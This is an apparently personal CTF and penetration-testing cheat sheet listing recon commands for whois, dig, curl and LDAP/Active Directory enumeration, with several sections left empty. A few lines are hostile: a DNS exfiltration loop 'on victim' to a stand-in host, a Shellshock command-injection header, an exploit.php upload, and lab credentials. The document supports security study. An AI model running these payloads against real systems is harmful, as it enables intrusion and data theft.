# CTF & PenTesting Directory
A directory for every (most) Cyber Security / PenTest topics
 - [HackTricks](https://book.hacktricks.wiki/en/index.html)
 - [HackTricks Cloud](https://cloud.hacktricks.wiki/en/index.html)
 - [OWASP](https://owasp.org/www-project-web-security-testing-guide/v42/)
 - [HackTheBox Academy](https://academy.hackthebox.com)

**1. Recon Methodology:**
- Port Scanning, Network Mapping, and Service Enumeration with `Nmap`
- OS Fingerprinting with `Nmap`, `Wappalyzer`, `WhatWeb`, and `wafw00f`
- Vulnerability Scanning with `Nessus`, `OpenVAS` and `Nikto`
- Banner Grabbing with `Netcat` and `curl`
- Web Spidering with `Burp Suite`, `OWASP ZAP Spider`, `Scrapy`
- Search engines `Google Dorking`, `DuckDuckGo`, `Shodan`, `Yandex`, `Baidu`
- `WHOIS` Lookups for domain registration details
- DNS Zone Transfers and Subdomain Bruteforcing with `dig`, `nslookup`, `dnsenum` or `dnsrecon`
- Virtual Host Discovery with `gobuster` and `ffuf`
- Web Archive Analysis with `Wayback Machine`
- Social Media Analysis with `LinkedIn`, `Twitter/X`, `Facebook`, `Instagram`
- Code Repositories with `GitHub` and `GutLab`
- Certificate Transparency with `crt.sh` and `Censys`


## Browser DevTools Shortcuts
Show DevTools - `[CTRL+SHIFT+I]` or `[F12]` 
Show Network tab  `[CTRL+SHIFT+E]` 
Show Console tab  `[CTRL+SHIFT+K]` 

## General
Add to /etc/hosts- `echo "192.168.1.100 example.com" | sudo tee -a /etc/hosts`
Determine file type - `file -i file.txt`  
Extract/Unzip file - `unzip file.txt -d extractedfileoutput.txt`  


# 1. **Recon**
# [WHOIS](https://whoisrb.org/docs/) commands
The `whois` command queries **WHOIS databases** to retrieve information about domain registrations, IP addresses, and network ownership. 

Basic WHOIS Lookup `whois example.com` 
Use grep for specifics `whois google.com \| grep "Name Server"` 
Team Cymru malware hash lookup using whois: (Note: Output is timestamp of last seen and detection rate) `whois -h hash.cymru.com <SUSPICIOUS FILE HASH>` 

# [dig](https://linux.die.net/man/1/dig) commands
The `dig` command (Domain Information Groper) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records

Performs a default A record lookup for the domain. - `dig domain.com` 
 Retrieves the IPv4 address (A record) associated with the domain. - `dig domain.com A` 
 Retrieves the IPv6 address (AAAA record) associated with the domain. - `dig domain.com AAAA` 
 Finds the mail servers (MX records) responsible for the domain - `dig domain.com MX` 
 Identifies the authoritative name servers for the domain - `dig domain.com NS` 
 Retrieves any TXT records associated with the domain - `dig domain.com TXT` 
 Retrieves the canonical name (CNAME) record for the domain - `dig domain.com CNAME`
 Retrieves the start of authority (SOA) record for the domain - `dig domain.com SOA` 
 Specifies a specific name server to query; in this case 1.1.1.1 - `dig @1.1.1.1 domain.com` 
 Shows the full path of DNS resolution - `dig +trace domain.com` 
 Performs a reverse lookup on the IP address 192.168.1.1 to find the associated hostname. You may need to specify a name server - `dig -x 192.168.1.1` 
 Provides a short, concise answer to the query. - `dig +short domain.com` 
 Displays only the answer section of the query output. - `dig +noall +answer domain.com` 
 Retrieves all available DNS records for the domain (Note: Many DNS servers ignore ANY queries to reduce load and prevent abuse, as per RFC 8482). - `dig domain.com ANY` 
 Reverse domain lookup - `dig -x <IP_ADDRESS>` 
 DNS zone transfer - `dig axfr <DOMAIN_NAME_TO_TRANSFER> @<DNS_IP>` 
 DNS reverse lookup (Replace first three octets of IP to set class C address to scan) - `for ip in {1..254..1}; do dig –x 1.1.1.$ip \| grep $ip >> dns.txt; done;`
 On Victim: Read in each line and do a DNS lookup - `for b in `cat file.hex `; do dig $b.shell.evilexample.com; done`
 Lookup domain by IP - `dig -x <ip>`
 Host transfer - `dig @ <ip> <domain> it AXFR`

**Caution**: Some servers can detect and block excessive DNS queries. Use caution and respect rate limits. Always obtain permission before performing extensive DNS reconnaissance on a target.

---

## [cURL](https://curl.se/docs/) Commands
`cURL` is a command-line tool for transferring data using various protocols (HTTP, HTTPS, FTP, etc.). It is commonly used for making web requests, downloading/uploading files, testing APIs, and automating network tasks.

### **General & Help Flags**
cURL help menu - `curl -h` / `curl --help-all` 
Shows all available options in a long list - `curl --help all` 
Lists all available categories of options - `curl --help category` 
Shows help for a specific category (e.g., HTTP) - `curl --help http` 
Displays the full manual page - `curl -M` / `curl --manual` 
Shows the version of `curl`, supported protocols, and features - `curl -V` / `curl --version` 

### **Verbose Output Flags**
Provides detailed request/response info - `curl -v https://example.com` / `curl --verbose https://example.com` 
Hides progress and error messages - `curl -s https://example.com` / `curl --silent https://example.com` 
Hides progress but still shows errors - `curl -sS https://example.com` 

### **Debugging Headers & Data**
Displays response headers with body - `curl -i https://example.com` / `curl --include https://example.com` 
Fetches only headers (no body) - `curl -I https://example.com` / `curl --head https://example.com` 
Logs detailed request/response data to file - `curl --trace curl.log https://example.com` 
Logs request/response data in ASCII format - `curl --trace-ascii curl.log https://example.com` 
Custom output formatting (e.g., response time) - `curl -w "Response Code: %{http_code}\n" -o /dev/null -s https://example.com`

### **HTTP Methods & Request Manipulation**
Basic GET request | `curl inlanefreight.com` |
Sends a custom HTTP request method - `curl -X PUT https://example.com/resource` 
Modifies or adds custom headers - `curl -H "X-Forwarded-For: 127.0.0.1" https://example.com` 
Sends data via POST request - `curl -X POST -d "username=admin&password=admin" https://example.com/login` 
Reads request body from a file - `curl -X POST -H "Content-Type: application/json" -d @data.json https://example.com/api` 

### **Authentication & Cookies**
Uses Basic Authentication - `curl -u admin:password https://example.com/protected` 
Uses a session cookie - `curl -b "PHPSESSID=abcd1234" https://example.com/dashboard` 
Stores cookies from a response - `curl -c cookies.txt https://example.com` 
Uses stored cookies for a new request - `curl -b cookies.txt https://example.com` 

### **Proxy & Evasion Techniques**
Sends requests through a proxy - `curl -x http://proxy.example.com:8080 https://target.com` 
Uses a SOCKS5 proxy (e.g., Tor) - `curl --socks5 127.0.0.1:9050 https://target.onion` 
Changes the User-Agent string - `curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://example.com` 
Spoofs the Referer header - `curl -e "https://google.com" https://example.com` 

### **Enumeration & Reconnaissance**
Checks available HTTP methods - `curl -X OPTIONS -i https://example.com`
Follows redirects - `curl -L https://example.com` 
Measures response time - `curl -o /dev/null -s -w "Time: %{time_total}s\n" https://example.com` 
Dumps response headers - `curl -I https://example.com` 

### **File Transfers & Exploitation**
Uploads a file via POST - `curl -F "file=@exploit.php" https://example.com/upload` 
Uploads a file via PUT - `curl -X PUT --data-binary @exploit.php https://example.com/exploit.php` 
Downloads a file from a server - `curl -O https://example.com/file.txt` 
Executes command injection through headers - `curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" https://example.com` 

### **API Interactions & Security Tools**
Read API entry - `curl http://<SERVER_IP>:<PORT>/api.php/city/london` 
Read all API entries - `curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq` 
Create API entry - `curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` 
Update API entry - `curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` 
Delete API entry - `curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City` 
Send a suspicious hash to VirusTotal - `curl -v --request POST --url 'https://www.virustotal.com/vtapi/v2/file/report' -d apikey=<VT API KEY> -d 'resource=<SUSPICIOUS FILE HASH>'` 
Send a suspicious file to VirusTotal - `curl -v -F 'file=/<PATH TO FILE>/<SUSPICIOUS FILE NAME>' -F apikey=<VT API KEY> https://www.virustotal.com/vtapi/v2/file/scan` 

---

# [dnsenum](https://github.com/fwaeytens/dnsenum) commands
Comprehensive DNS enumeration tool that supports dictionary and brute-force attacks for discovering subdomains.

---

# [dnsrecon](https://github.com/darkoperator/dnsrecon) commands
Versatile tool that combines multiple DNS reconnaissance techniques and offers customisable output formats.

# ldap
Lightweight Directory Access Protocol (LDAP) is an integral part of Active Directory (AD). AD Powershell module cmdlets with `-Filter` and `-LDAPFilter` flags are usually how search or filter for LDAP information, e.g:
 - `Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name`
 - `Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL)' | select Name`
 - `Get-ADUser -Properties * -LDAPFilter '(&(objectCategory=user)(description=*))' | select samaccountname,description`
 - `Get-ADComputer -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select DistinguishedName,servicePrincipalName,TrustedForDelegation | fl`
 - `Get-AdUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))(adminCount=1)' -Properties * | select name,memberof | fl`
 - `Get-ADUser -Identity harry.jones -Properties * | select memberof | ft -Wrap`
 - `Get-ADGroup -Filter 'member -RecursiveMatch "CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL"' | select name`
 - `(Get-ADUser -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -Filter *).count`

## Unauthenticated enumeration
To check if we can interact with LDAP without credentials run this python:
```p
from ldap3 import *
s = Server('<IP>', get_info = ALL)
c = Connection(s,'','')
c.bind()

Should return: True

s.info
exit()
```
If you can anonymously enumerate ldap, then `s.info` should give you the CN and DCs e.g `CN=Configuration,DC=sequel,DC=htb`. Then you can use the ldapsearch tool.
- `ldapsearch -H ldap://10.129.1.207 -x -b "dc=inlanefreight,dc=local"`

Windapsearch.py is a Python script used to perform anonymous and authenticated LDAP enumeration of AD users, groups, and computers using LDAP queries. It is an alternative to tools such as ldapsearch, which require you to craft custom LDAP queries:
- To confirm connection - `python3 windapsearch.py --dc-ip 10.129.1.207 -u "" --functionality`
- Pull list of users - `python3 windapsearch.py --dc-ip 10.129.1.207 -u "" -U`
- Pull list of computers - `python3 windapsearch.py --dc-ip 10.129.1.207 -u "" -C`
- Authenitcated search - `python3 windapsearch.py --dc-ip 10.129.85.28 -u "rose" -p "KxEPkKe6R8su"`

ldapsearch-ad.py is another tool worth trying:
- `python3 ldapsearch-ad.py -h`
- `python3 ldapsearch-ad.py -l 10.129.85.28 -t info`

## Authenticated Enumeration
- `python3 windapsearch.py --dc-ip 10.129.1.207 -u inlanefreight\\james.cross --da` (`domain\\username`)
- `python3 ldapsearch-ad.py -l 10.129.1.207 -d inlanefreight -u james.cross -p Summer2020 -t pass-pols`
- Will reveal if accounts are prone to kerberoast: `python3 ldapsearch-ad.py -l 10.129.85.28 -d sequel -u rose -p KxEPkKe6R8su -t all`



# HTTPie

# Wget Commands

# Netcat (nc) Commands

# Telnet Commands

# FFuf Commands

# Dirb

# Gobuster

# Wappalyzer

# Tcpdump

# Tshark

# SQLmap

# Nikto

# Hydra

# JWT-Tool

# smb commands
